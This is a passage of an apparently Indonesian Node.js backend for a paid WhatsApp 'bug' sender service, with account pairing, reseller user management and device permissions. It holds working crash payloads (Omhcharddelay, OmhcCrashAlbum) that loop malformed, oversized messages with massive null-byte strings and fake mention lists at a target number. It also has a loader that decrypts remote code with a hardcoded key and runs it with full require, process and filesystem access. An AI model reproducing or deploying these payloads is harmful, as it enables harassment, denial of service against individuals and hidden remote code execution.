        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    const sock = await checkActiveSessionInFolder(user.username, true);
    if (!sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi tersedia.`);
      return;
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "OMHCMBUD")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
});

// 🔹 Endpoint device-permission - simpan/ambil permission akses device per username
const devicePermFile = './device_perms.json';
function loadDevicePerms() {
  try {
    if (require('fs').existsSync(devicePermFile)) {
      return JSON.parse(require('fs').readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}
function saveDevicePerms(data) {
  require('fs').writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

// GET /devicePerms - ambil permission untuk username ini
app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
  
  // Owner selalu approved
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    // Owner cek dirinya sendiri
    const isOwner = requester?.role === 'owner';
    if (isOwner && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }
  
  return res.json({ valid: true, ...userPerm });
});

// POST /setDevicePerm - owner atur permission user lain
app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }
  
  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
  
  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);
  
  return res.json({ valid: true, message: "Permission updated" });
});

// GET /listDevicePerms - owner lihat semua permission
app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);
    
  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
        
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || (creator.role !== "owner" && creator.role !== "dev")) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
    pairId: genPairId(),
  };

  db.push(newUser);
  saveDatabase(db);
    
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, authorized: false, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Allow owner and admin to view logs; member only sees own logs
  const canViewAll = user && (user.role === "owner" || user.role === "admin");

  try {
    let logs = [];
    if (fs.existsSync("logUser.txt")) {
      const logContent = fs.readFileSync("logUser.txt", "utf-8");
      const lines = logContent.split("\n").filter(l => l.trim() !== "");
      logs = lines.map((line, i) => {
        // Parse: "actor Action target [detail]"
        const parts = line.trim().split(/\s+/);
        const actor = parts[0] || "system";
        const action = parts[1] || "activity";
        const target = parts[2] || "";
        const detail = parts.slice(3).join(" ");
        return {
          id: i + 1,
          timestamp: new Date(Date.now() - (lines.length - i) * 60000).toISOString(),
          activity: action.toLowerCase(),
          actor,
          target,
          description: line.trim(),
          details: {
            target: target || null,
            actor: actor || null,
            info: detail || null
          }
        };
      }).reverse(); // newest first
    }

    // Filter by user if not owner/admin
    if (!canViewAll && user) {
      logs = logs.filter(l => l.actor === user.username || l.target === user.username);
    }

    return res.json({ valid: true, authorized: canViewAll, logs });
  } catch (err) {
    return res.json({ valid: true, authorized: false, logs: [], error: "Failed to read log file." });
  }
});

// ===== Register (self-register untuk member/free user) =====
app.post("/register", (req, res) => {
  const { username, password, androidId } = req.body;

  if (!username || !password) {
    return res.json({ valid: false, message: "Username dan password wajib diisi" });
  }
  if (username.length < 3) {
    return res.json({ valid: false, message: "Username minimal 3 karakter" });
  }
  if (password.length < 4) {
    return res.json({ valid: false, message: "Password minimal 4 karakter" });
  }

  const db = loadDatabase();
  if (db.find(u => u.username === username)) {
    return res.json({ valid: false, message: "Username sudah digunakan" });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + 7); // 7 hari free trial

  const newAccount = {
    username: username,
    password: password,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);

  console.log("[✅ REGISTER] Akun baru dibuat:", newAccount);
  const logLine = `Self-Register ${username} (member, 7 days)\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({
    valid: true,
    created: true,
    message: "Akun berhasil dibuat! Silakan login.",
    user: { username: newAccount.username, role: newAccount.role, expiredDate: newAccount.expiredDate }
  });
});

// ============================================================
// API PREFIX ROUTER - Map semua /api/xxx/yyy ke endpoint asli
// ============================================================

// --- /api/auth/* ---
app.post('/api/auth/validate', (req, res) => { req.url = '/validate'; app.handle(req, res); });
app.get('/api/auth/myInfo', (req, res) => { req.url = '/myInfo'; app.handle(req, res); });
app.post('/api/auth/register', (req, res) => { req.url = '/register'; app.handle(req, res); });

// --- /api/user/* ---
app.post('/api/user/changepass', (req, res) => { req.url = '/changepass'; app.handle(req, res); });
app.get('/api/user/createAccount', (req, res) => { req.url = '/createAccount?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/deleteUser', (req, res) => { req.url = '/deleteUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/listUsers', (req, res) => { req.url = '/listUsers?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/userAdd', (req, res) => { req.url = '/userAdd?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/editUser', (req, res) => { req.url = '/editUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/getActivityLogs', (req, res) => { req.url = '/getLog?' + (req.url.split('?')[1]||''); app.handle(req, res); });

// --- /api/device-perm/* ---
app.get('/api/device/getPerms', (req, res) => { req.url = '/devicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm', (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', (req, res) => { req.url = '/listDevicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
// ============================================================
// END API PREFIX ROUTER
// ============================================================

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function Omhcharddelay(sock, target, mention) {
const x = "\u0000".repeat(9000);
const Silence = "999999999999";
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
const Silent = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: x,
          name: x,
          publisher: x,
          fileLength: Silence,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",

          contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 899099}@s.whatsapp.net`
            }))
          },
         },
        }
      }
    }
  };

  await sock.relayMessage(target, Silent, {
    participant: { jid: target }
  });
}

const mentiondellay = Array.from({ length: 1900 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const simple = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: mentiondellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statuSerentributionType: 2,
    },
  };
  const Massagemention = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 3,
    },
  };
  
  const omhc = generateWAMessageFromContent(target, simple, Massagemention, {});

  await sock.relayMessage("status@broadcast", omhc.message, {
    messageId: omhc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: omhc.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ mention Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }


  const msg22 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "YAKUZA X SILENCE 🥀",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg22.message, {
    messageId: msg22.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u0003",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    
    const msg1 = generateWAMessageFromContent(target, generateMessage, {});
    
  const Silencedellay = Array.from({ length: 1902 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: Silencedellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statuSerentributionType: 2,
    },
  };
  const MassageSilence = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg2 = generateWAMessageFromContent(target, MSG, MassageSilence, {});

  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Silence Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function OmhcCrashAlbum(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: {
              participant: "131355550002@s.whatsapp.net",
              remoteJid: "status@broadcast",
              id: ""
            },
            type: "REVOKE"
          }
        }
      },
      message: {
        messageContextInfo: {
          mentionedJid: [target]
        },
        viewOnceMessageV2: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091"
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );

  try {
    const video = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      fileLength: "10610",
      mediaKeyTimestamp: "1775044724",
      stickerSentTs: "1775044724091"
    };

    const res = await fetch("https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true.mp4");
    const ab = await res.arrayBuffer();
    const buffer = Buffer.from(ab);

    let index = 0;

    if (buffer.length >= 4) {
      index = buffer.readUInt32BE(0);
    }

    if (!Number.isFinite(index) || index <= 0) index = 1;
    if (index > buffer.length) index = buffer.length;

